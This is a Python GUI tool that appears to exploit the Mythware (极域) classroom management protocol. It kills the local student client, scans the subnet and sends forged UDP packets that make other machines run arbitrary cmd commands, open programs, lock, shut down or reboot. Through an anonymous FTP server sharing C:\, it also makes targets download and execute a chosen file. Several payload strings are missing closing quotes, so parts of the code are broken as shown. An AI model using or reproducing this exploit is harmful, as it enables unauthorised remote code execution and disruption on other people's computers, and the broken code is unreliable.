import socket
import tkinter as tk
from tkinter import messagebox
import binascii
import os
import subprocess
import threading
import random
import string
import time
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler,ThrottledDTPHandler
from pyftpdlib.servers import FTPServer
import logging

Port = 4705
IP = ''  # '192.168.1.105'
lhost = ''
IPtable = []
TargetIP = []
Pid = ''
def SearchIp():
    IPtable.clear()
    TargetIP.clear()
    # def get_os():
    #     os = platform.system()
    #     if os == "Windows":
    #         return "n"
    #     else:
    #         return "c"

    def ping_ip(ip_str):
        cmd = ["ping", "-{op}".format(op="n"),
               "1", ip_str]
        output = os.popen(" ".join(cmd)).readlines()
        for line in output:
            if str(line).upper().find("TTL") >= 0:
                # print("ip: %s 在线" % ip_str)
                IPtable.append(ip_str)
                break

    def find_ip(ip_prefix):
        threads = []
        for i in range(1, 256):
            ip = '%s.%s' % (ip_prefix, i)
            threads.append(threading.Thread(target=ping_ip, args={ip, }))
        for i in threads:
            i.start()
        for i in threads:
            i.join()

    args = "".join(lhost)
    ip_pre = '.'.join(args.split('.')[:-1])
    find_ip(ip_pre)

    txt1.delete(0,tk.END)
    txt4.delete(0,tk.END)
    txt1.insert('end', lhost)
    txt4.insert('end', str(len(IPtable)))
    messagebox.showinfo('X提醒', f'获取到{len(IPtable)}个IP')
    print(lhost)

def lock():
    global TargetIP
    TargetIP.clear()
    TargetIP = IPtable.copy()
    print(IPtable)
    if len(IPtable)==0:
        messagebox.showwarning('X提醒','请检测IP啊哥哥')
    else:
        messagebox.showinfo('X提醒','您接下来的操作会攻击到所有IP!')
        b11.config(fg='red')
        b12.config(fg='black')
        txt4.delete(0, tk.END)
        txt4.insert('end', str(len(TargetIP)))

def release():
    TargetIP.clear()
    TargetIP.append(txt1.get())
    if len(txt1.get())<2:
        messagebox.showwarning('X提醒','请检测IP啊哥哥')
    else:
        b11.config(fg='black')
        b12.config(fg='red')
        messagebox.showinfo('X提醒', '您接下来的操作会攻击到目标IP!')
        txt4.delete(0, tk.END)
        txt4.insert('end', '1')

def openfile():
    # 获取所有选项的状态
    status1 = var1.get()
    status2 = var2.get()
    status3 = var3.get()
    status4 = var4.get()
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for ip in TargetIP:
        print(type(ip))
        if status1:  # cmd
            payload_cmd = f'444d4f43000001006e030000{random.randint(11, 99)}2f558bb732684aa13055feb4be1f26204e0000c0a8016a610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002ee5'
            payload_bytes1 = bytes.fromhex(payload_cmd)
            udp_socket.sendto(payload_bytes1, (f"{ip}", Port))
        if status2:  # calc
            payload_calc = f'444d4f43000001006e030000{random.randint(11, 99)}b041570e7479469159c45494e9a18f204e0000c0a8016a610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c00430041004c0043002ebe'
            payload_bytes2 = bytes.fromhex(payload_calc)
            udp_socket.sendto(payload_bytes2, (ip, Port))
        if status3:  # notepad
            payload_notepad = f'444d4f43000001006e030000{random.randint(11, 99)}ddedf2f9af8d4ab9a0f5aa80c8e9d1204e0000c0a8016a610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c004e004f00540045005000410044002e00450058004500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000be'
            payload_bytes3 = bytes.fromhex(payload_notepad)
            udp_socket.sendto(payload_bytes3, (ip, Port))
        if status4:  # wordpad
            payload_mspaint = f'444d4f43000001006e030000{random.randint(11, 99)}299c895827434f9df386c2d5e948ee204e0000c0a8016a610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c004d0053005000410049004e0054002e
            payload_bytes4 = bytes.fromhex(payload_mspaint)
            udp_socket.sendto(payload_bytes4, (ip, Port))
    udp_socket.close()

def openhtml():
    url = 'www.jd.com'
    url_hex = ''
    for c in url:
        x = ord(c)
        url_hex += hex(x)
    payload_url = url_hex.replace('0x', '00')
    print(payload_url)
    payload=f'444d4f43000001003e000000{random.randint(11, 99)}d2bc4a6f26d341aac3ec265b27b7cf204e0000c0a8016a3100000031000000000200000000000018000000000000{payload_url}0000000000'
    send(payload)
# 下载：bitsadmin /transfer DownloadWebFile /download /priority normal https:192.168.1.103/xxx.rar C:\xxx.rar
def send_msg():
    payload=(b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x9e\x03\x00\x00")
    a=f'{random.randint(11,99)}'
    payload+=binascii.unhexlify(a)  #b"\x7c"
    payload +=b"\x73\x6b\xf7\x79\x0c\xdd\x46\x9d\x87\x4b\x4d\x79\xbc\x2b\x8d\x20\x4e\x00\x00\xc0\xa8\xab\x83\x91\x03\x00\x00\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    message=txt2.get()
    aaa=""
    for i in message:
        if (i>="a" and i<="z")or(i>="A" and i<="Z"):
            aaa+="00"
        aaa+=hex(ord(i))[2:]
    js=0
    aaa=list(aaa)
    for i in aaa:
        if(js%4==0):
            aaa[js],aaa[js+2]=aaa[js+2],aaa[js]
            aaa[js+1],aaa[js+3]=aaa[js+3],aaa[js+1]
        js+=1
    aaa=''.join(aaa)
    send=binascii.unhexlify(aaa)
    payload+=send
    payload+=b"\x00"*(898-len(send))
    for ip in TargetIP:
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.sendto(payload,(ip,Port))
# def send_msg ():
#     content = txt2.get()
#     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     for ip in TargetIP:
#         ss = ''
#         for c in content:
#             if 'CJK' in unicodedata.name(c):
#                 x = ord(c)
#                 ss += hex(x)[4] + hex(x)[5] + hex(x)[2] + hex(x)[3]
#             else:
#                 x = ord(c)
#                 t = hex(x).replace('0x', '00')
#                 ss += t[2] + t[3] + t[0] + t[1]
#         print(ss)
#         payload_msg = ss
#         print(payload_msg)
#         data_msg = f'444d4f43000001009e030000{random.randint(11, 99)}b012af80d72446bd42c9fb286cdab0204e0000c0a8016a9103000091030000000800000000000005000000{payload_msg}
#         payload_bytes = bytes.fromhex(data_msg)
#         udp_socket.sendto(payload_bytes, (f"{ip}", Port))
#
#     udp_socket.close()
#     print('发送成功')
def send_cmd(txt=''):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for ip in TargetIP:
        if(txt==''):
            txt = txt3.get()

        txt_hex = ''
        for i in range(len(txt)):
            if i == ' ':
                txt_hex += 20
            txt_hex = txt_hex + hex(ord(txt[i]))[2:] + "00"
        payload = f'444d4f43000001006e030000{random.randint(11, 99)}44dcfa94cc8a4ba5fffa49b0caa95f204e0000c0a81484610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e0065007800650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002f006b002000{txt_hex}
        payload_bytes = bytes.fromhex(payload)
        # ip = '192.168.1.105'
        udp_socket.sendto(payload_bytes, (f"{ip}", Port))
    udp_socket.close()
def sleep():
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for ip in TargetIP:
        txt = 'rundll32.exe user32.dll,LockWorkStation && exit'
        txt_hex = ''
        for i in range(len(txt)):
            if i == ' ':
                txt_hex += 20
            txt_hex = txt_hex + hex(ord(txt[i]))[2:] + "00"
        payload = f'444d4f43000001006e030000{random.randint(11, 99)}44dcfa94cc8a4ba5fffa49b0caa95f204e0000c0a81484610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002ef006b002000{txt_hex}
        payload_bytes = bytes.fromhex(payload)
        # ip = '192.168.1.105'
        udp_socket.sendto(payload_bytes, (f"{ip}", Port))

    udp_socket.close()
def send(payload):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for ip in TargetIP:
        payload_bytes = bytes.fromhex(payload)
        udp_socket.sendto(payload_bytes, (f"{ip}", Port))
    udp_socket.close()
def shutdown():
    payload='444d4f43000001002a0200007b10b3ecaa98c24cbd9360583e61e637204e0000c0a8016a1d0200001d0200000002000000000000140000000f0000000100000000000000d19ea25b065c7351ed95a8608476a18b977b3a
    send(payload)
def reboot():
    payload='444d4f43000001002a02000058749b2c8803a648bd3a8fd0842a1962204e0000c0a8016a1d0200001d0200000002000000000000130000000f0000000100000000000000d19ea25b065ccd912f54a8608476a18b977b3a
    send(payload)
def sign(): # 签到--待更新
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #while 1:
    letters_and_digits = string.ascii_lowercase + string.digits
    token = ''.join(random.choice(letters_and_digits) for i in range(32))
    print(token)
    payload = f'444d4f430000010026000000{token}204e0000c0a8019b190000001900000000020000000000001b00000001000000030000000000'
    #payload = f'444d4f43000001002600000049f65c13ca2f4f43b28e64086f1ba8f0204e0000c0a80112190000001900000000020000000000001b00000001000000030000000000'
    for ip in TargetIP:
        payload_bytes = bytes.fromhex(payload)
        udp_socket.sendto(payload_bytes, (f"{ip}", Port))
    udp_socket.close()
def closeapp():
    payload = '444d4f43000001002a020000ce7de4f7eff47d4bafb480529a8a022c204e0000c0a8016a1d0200001d0200000002000000000000020000000f0000000100000000000000d19ea25b065c7351ed95a8608476945e28750b7a8f5e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000046'
    send(payload)

flag = 0
def init():
    global Pid
    print('软件初始化')
    # 获取本地IP

    global lhost
    lname = socket.getfqdn(socket.gethostname())
    lhost = socket.gethostbyname(lname)


    global flag
    flag=0
    subprocess.run(f'taskkill -f -im StudentMain.exe ', shell=True)

    messagebox.showinfo('X提醒','已为您杀掉极域！')
def killjy():
    global flag
    if flag==1:
        init()
        b13.config(text='恢复极域')
        flag=0
    else:
        os.startfile(r'C:\Program Files (x86)\Mythware\极域课堂管理系统软件V6.0 2016 豪华版\StudentMain.exe')
        # os.system('C:\Program Files (x86)\Mythware\极域课堂管理系统软件V6.0 2016 豪华版\StudentMain.exe')
        #           C:\Program Files (x86)\Mythware\极域课堂管理系统软件V6.0 2016 豪华版\StudentMain.exe
        flag=1
        b13.config(text='杀掉极域')

def aboutme():
    messagebox.showinfo("X提醒","本软件仅供学习研究\n若无效果请更换极域版本使用 \n修复建议+q485232109")
def ver2016():
    global Port
    Port = 4705 #2016
    messagebox.showinfo("X提醒", "端口切换为:4705")
def ver2022():
    global Port
    Port = 4988 # 2022
    messagebox.showinfo("X提醒", "端口切换为:4988")
def ftp():
    logger = logging.getLogger('FTP-LOG')
    logger.setLevel(logging.DEBUG)
    cs = logging.StreamHandler()
    cs.setLevel(logging.INFO)
    fs = logging.FileHandler(filename='test.log', mode='a', encoding='utf-8')
    fs.setLevel(logging.DEBUG)
    formatter = logging.Formatter('[%(asctime)s] %(name)s - %(levelname)s : %(message)s')
    cs.setFormatter(formatter)
    fs.setFormatter(formatter)
    logger.addHandler(cs)
    logger.addHandler(fs)
    # 2.实例化虚拟用户，这是FTP的首要条件
    authorizer = DummyAuthorizer()
    # 3.添加用户权限和路径，括号内的参数是(用户名、密码、用户目录、权限)，可以为不同的用户添加不同的目录和权限
    authorizer.add_user('user', '123456', "c:/", perm="elradfmw")
    # 4.添加匿名用户，只需要路径
    authorizer.add_anonymous("c:/")
    # 5.初始化ftp句柄
    handler = FTPHandler
    handler.authorizer = authorizer
    # 6.添加被动端口范围
    handler.passive_ports = range(2000, 20033)
    # 7.上传下载的速度设置
    dtp_handler = ThrottledDTPHandler
    dtp_handler.read_limit = 300 * 1024  # 300 kb/s
    dtp_handler.write_limit = 300 * 1024  # 300 kb/s
    handler.dtp_handler = dtp_handler
    # 8.监听ip和端口 ， linux里需要root用户才能使用21端口
    server = FTPServer(('0.0.0.0', 21), handler)
    # 9.最大连接数
    server.max_cons = 150
    server.max_cons_per_ip = 15
    # 10.开始服务，自带打印日志信息
    server.serve_forever()

# 上传文件
def choose():
    # 删除原有记录
    dell = ('cd %appdata% && del -f -q x.txt && exit')
    send_cmd(dell)
    txt5.delete(0,tk.END)
    import tkinter.filedialog
    path = tkinter.filedialog.askopenfilename(title='X文件选择')
    txt5.insert(0,path)

def start_ftp():
    # 启动ftp服务
    # 创建线程
    ftp_thr = (threading.Thread(target=ftp))
    ftp_thr.daemon = True  # 守护线程
    ftp_thr.start()
def upload_file():

    filename = txt5.get()
    txt = (f'cd %appdata% && echo open {lhost}>>x.txt && echo user>>x.txt&& '
           f'echo 123456>>x.txt&& echo get {filename[3::]}>>x.txt &&exit')
    send_cmd(txt)
    time.sleep(1)
    txt2=(f'cd %appdata% &&echo close>>x.txt && echo bye>>x.txt&&exit')
    send_cmd(txt2)
    time.sleep(1)
    s = filename.rfind('/')
    file = filename[s + 1::]
    print(file)
    op_file=f'cd %appdata% &&ftp -s:%appdata%/x.txt&& start {file} &&exit'
    send_cmd(op_file)

# UI界面
root=tk.Tk()
root.title('X反极域 v3.0')
# 居中设置
sw = root.winfo_screenwidth()
sh = root.winfo_screenheight()
x = (sw-600)//2 # 2   #窗口水平位置
y = (sh-430)//2 # 2    #窗口垂直位置
root.geometry("600x430+%d+%d" %(x,y))
root.config(background='honeydew')#honeydew
root.resizable(0,0) # 固定大小



# 关于作者
about = tk.Menu(root)

editmenu = tk.Menu(about,tearoff=False)
editmenu.add_command(label='2016豪华版v6.0',command=ver2016)
editmenu.add_command(label='2022专业版v6.0',command=ver2022)
about.add_cascade(label='选择极域版本',menu=editmenu)
about.add_command(label='关于软件',command=aboutme)
root.config(menu=about)

# 初始化 杀掉极域
init()
# 启动ftp服务
start_ftp()

b13=tk.Button(root,text='恢复极域',font=('楷体',15),bg='honeydew',fg='blue',command=killjy,width=15)
b13.place(x=5,y=5)

lb1 = tk.Label(root,text='目标IP:',font=('楷体',20),bg='honeydew',fg='green').place(x=70,y=50)
txt1 = tk.Entry(root,font=('楷体',20),width=18,fg='red')
txt1.place(x=180,y=50,height=30)
lb6 = tk.Label(root,text='当前IP个数:',font=('楷体',20),bg='honeydew',fg='green').place(x=60,y=105)
txt4 = tk.Entry(root,font=('楷体',15),width=3,fg='red')
txt4.place(x=230,y=105,height=30)
b11 = tk.Button(root,text='锁定所有IP',font=('楷体',15),bg='honeydew',fg='black',command=lock)
b11.place(x=275,y=100)
b12 = tk.Button(root,text='锁定目标IP',font=('楷体',15),bg='honeydew',fg='black',command=release)
b12.place(x=400,y=100)

# 多选框
var1 = tk.IntVar()
var2 = tk.IntVar()
var3 = tk.IntVar()
var4 = tk.IntVar()
lb2=tk.Label(root,text='打开程序:',font=('楷体',15),bg='honeydew')
lb2.place(x=20,y=160)
chek1 = tk.Checkbutton(root,text='cmd',font=('楷体',15),variable=var1, bg='honeydew',onvalue=1, offvalue=0,width=6,height=1)
chek1.place(x=120,y=160)
chek2 = tk.Checkbutton(root,text='计算器',font=('楷体',15),variable=var2,bg='honeydew', onvalue=1, offvalue=0,width=6,height=1)
chek2.place(x=205,y=160)
chek3 = tk.Checkbutton(root,text='记事本',font=('楷体',15),variable=var3,bg='honeydew',  onvalue=1, offvalue=0,width=6,height=1)
chek3.place(x=305,y=160)
chek4 = tk.Checkbutton(root,text='画图',font=('楷体',15),variable=var4,bg='honeydew',  onvalue=1, offvalue=0,width=6,height=1)
chek4.place(x=390,y=160)
b2=tk.Button(root,text='打开',font=('楷体',15),command=openfile,width=7,bg='honeydew',fg='purple').place(x=480,y=155)

lb3 = tk.Label(root,text='发消息 :',font=('楷体',15),bg='honeydew').place(x=35,y=230)
txt2 = tk.Entry(root,font=('楷体',14),width=30)
txt2.place(x=130,y=223,height=40)
b1 = tk.Button(root,text='发送',font=('楷体',15),command=send_msg,width=7,bg='honeydew',fg='blue').place(x=460,y=225)

lb4 = tk.Label(root,text='执行命令:',font=('楷体',15),bg='honeydew').place(x=30,y=280)
txt3 = tk.Entry(root,font=('楷体',15),width=30)
txt3.place(x=130,y=273,height=40)
b3 = tk.Button(root,text='执行',font=('楷体',15),command=send_cmd,width=7,bg='honeydew',fg='red').place(x=460,y=275)

chose_file = tk.Button(root,text='选择文件',font=('楷体',15),command=choose,width=8,height=1, bg='honeydew',fg='green').place(x=30,y=327)
txt5 = tk.Entry(root,font=('楷体',15),width=30)
txt5.place(x=130,y=330,height=30)
b_file= tk.Button(root,text='上传并执行',font=('楷体',15),command=upload_file,width=9,bg='honeydew',fg='green').place(x=450,y=325)

b4 = tk.Button(root,text='关机',font=('楷体',15),command=shutdown,width=7,bg='honeydew').place(x=360,y=380)
b5= tk.Button(root,text='重启',font=('楷体',15),command=reboot,width=7,bg='honeydew').place(x=260,y=380)
b6= tk.Button(root,text='锁屏',font=('楷体',15),command=sleep,width=7,bg='honeydew').place(x=160,y=380)
b7 = tk.Button(root,text='签到',font=('楷体',15),command=sign,width=7,bg='honeydew').place(x=60,y=380)
b8 = tk.Button(root,text='关闭软件',font=('楷体',15),command=closeapp,width=8,bg='honeydew').place(x=460,y=380)
# b9 = tk.Button(root,text='打开网页',font=('楷体',15),command=openhtml,width=7).place(x=60,y=400)
b10=tk.Button(root,text='检测IP',font=('楷体',15),command=SearchIp,width=8,bg='honeydew',fg='green').place(x=450,y=45)
#lb5 = tk.Label(root,text='X提醒这位同学:请务必确保课堂纪律！滥用后果自负！',font=('楷体',17),bg='honeydew',fg='deeppink').place(x=20,y=390)

root.mainloop()


